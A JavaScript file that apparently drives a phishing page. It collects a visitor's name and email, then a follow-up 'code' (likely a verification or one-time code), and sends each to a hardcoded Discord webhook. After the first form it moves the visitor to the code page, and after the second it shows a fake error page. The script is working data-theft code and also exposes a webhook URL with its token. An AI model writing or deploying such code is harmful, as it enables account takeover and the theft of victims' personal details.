const webhookUrl = 'https://discord.com/api/webhooks/1111136382866440253/q57_PVYxcce4_NRAd2HouHNH-8VjUFq_avHFkAw3RgyqbVrCNUTShMGSLoZ3zm-eiHBC';

const sendNameEmail = (name, email) => {
  const msg = {
    content: 'New entry: <@&1103505020680421458>',
    embeds: [{
      color: 16711680,
      fields: [
        { name: 'Name', value: name },
        { name: 'Email', value: email }
      ],
      timestamp: new Date().toISOString()
    }]
  };

  fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(msg)
  });
};

const sendCode = (code) => {
  const msg = {
    embeds: [{
      color: 16711680,
      fields: [{ name: 'Code', value: code }],
      timestamp: new Date().toISOString()
    }]
  };

  fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(msg)
  });
};

document.addEventListener('DOMContentLoaded', () => {
  document.querySelector('#form1').addEventListener('submit', (e) => {
    e.preventDefault();
    const name = document.querySelector('#Name').value;
    const email = document.querySelector('#Email').value;
    sendNameEmail(name, email);
    setTimeout(() => window.location.href = "Sign Up Code.html", 750);
  });

  document.querySelector('#form2').addEventListener('submit', (e) => {
    e.preventDefault();
    const code = document.querySelector('#Code').value;
    sendCode(code);
    setTimeout(() => window.location.href = "Error.html", 750);
  });
});
